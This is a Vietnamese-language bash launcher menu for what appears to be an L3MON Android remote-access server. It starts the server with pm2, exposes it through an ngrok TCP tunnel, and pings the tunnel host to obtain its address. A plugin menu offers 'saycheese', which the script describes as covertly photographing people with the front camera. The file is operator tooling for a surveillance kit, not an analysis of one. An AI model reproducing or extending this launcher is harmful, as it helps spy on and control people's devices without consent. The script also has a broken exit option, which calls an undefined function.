bl='\e[1;34m' 
wht='\e[1;37m'
re='\e[1;31m'
grn='\e[1;32m'
del='\e[0m'
ylw='\e[1;33m'
mgt='\e[1;35m'
cyn='\e[1;36m'
ver='v1.0'
lang='VN'

function menu(){
	clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- Ngôn ngữ: ${cyn}${lang}"
	echo ""
	echo " "
	pm2 status
	echo ""
	echo -e "${wht}⌜----------------------------------------⌝"
	echo -e " ${grn}[1]${wht} Khởi tạo server PM2	       "	
	echo -e " ${grn}[2]${wht} Đóng server PM2 	       "
	echo -e " ${grn}[3]${wht} Khởi tạo server Ngrok         "
	echo -e " ${grn}[4]${wht} Ping                          "
	echo -e " ${grn}[5]${wht} Một số công cụ khác            "
	echo -e " ${grn}[l]${wht} Thay đổi ngôn ngữ                    "
	echo -e " ${grn}[e]${wht} Thoát			       "
	echo -e "${wht}⌞----------------------------------------⌟"
	echo -ne " ${bl}[${re}L3MODi${bl}]${wht}==> "
	read req
  		case "$req" in
   		"1") srvpm2	
   		;;
   		"2") clspm2	
   		;;
   		"3") srvngrok       
   		;;
   		"4") srvping 
   		;;
   		"5") plugin_list 
   		;;
   		"l") language
   		;;
   		"e") exip
   		;;
   		"res") res
   		;;    
     			*)
			echo -ne " ${re}[!]${wht} Ký tự không hợp lệ "
			read 
			menu	 
   		;;	
  		esac
}

function srvpm2(){
        clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- Ngôn ngữ: ${cyn}${lang}"
	echo ""
	echo " "
	pm2 start index.js
	echo ""
	echo -e " ${bl}[${grn}✔${bl}]${wht} Đã khởi động server ( L3MON ). "
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Nhấn phím bất kỳ để tiếp tục... "
	read 
	menu
}

function clspm2(){
	clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- Ngôn ngữ: ${cyn}${lang}"
	echo ""
	echo " "
	pm2 stop index
	echo ""
	echo -e " ${bl}[${re}✘${bl}]${wht} Đã đóng server ( L3MON ). "
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Nhấn phím bất kỳ để tiếp tục... "
	read 
	menu
}

function srvngrok(){
        clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- Ngôn ngữ: ${cyn}${lang}"
	echo ""
	echo " "
	chmod +x ngrok_srv.sh
	gnome-terminal -- ./ngrok_srv.sh 
	echo -e " ${bl}[${grn}✔${bl}]:${wht} Đã khởi động server ( Ngrok ). "	
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Nhấn phím bất kỳ để tiếp tục... "
	read 
	menu
}

function srvping(){
	clear
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- Ngôn ngữ: ${cyn}${lang}"
	echo ""
	echo " "
	echo -e " ${bl}[${re}INS${bl}]${wht} Khi lấy được IP thì Ctrl + C để thoát "
	ping 0.tcp.ngrok.io
	echo -ne " ${bl}[${ylw}✍${bl}]${wht} Nhấn phím bất kỳ để tiếp tục... "
	read 
	menu
}

function exip1(){
	clear	
	exit
}

function res(){
	chmod +x ./vn_pack.sh
	./vn_pack.sh
}

function plugin_list(){
	clear 
	figlet -f pagga " L3MODi " | lolcat 
	echo -e "${wht}------[ BinIT™ - ${ver} ]----- Ngôn ngữ: ${cyn}${lang}"
	echo ""
	echo " "
	echo -e "${wht}⌜--------------------------------------------------------------⌝"
	echo -e " ${grn}[1]${wht} saycheese (Chụp ảnh lén lút với camera trước) "				       
	echo -e " ${grn}[e]${wht} Quay trở về menu "
	echo -e "${wht}⌞--------------------------------------------------------------⌟"
	echo -ne " ${bl}[${re}L3MODi${bl}]${wht}==> "
	read plugin
		case "$plugin" in
		"1") plugin1
		;;
		"e") returu
		;;
			*)
			echo -ne " ${re}[!]${wht} Ký tự không hợp lệ "
			read 
			plugin_list
		;;
		esac 
}

function plugin1(){
	clear
	cd plugin1
	chmod +x plugin1.sh
	./plugin1.sh
	plugin_list	
}

function returu(){
	menu
}

function language(){
	chmod +x l3mod.sh
	./l3mod.sh
}
menu










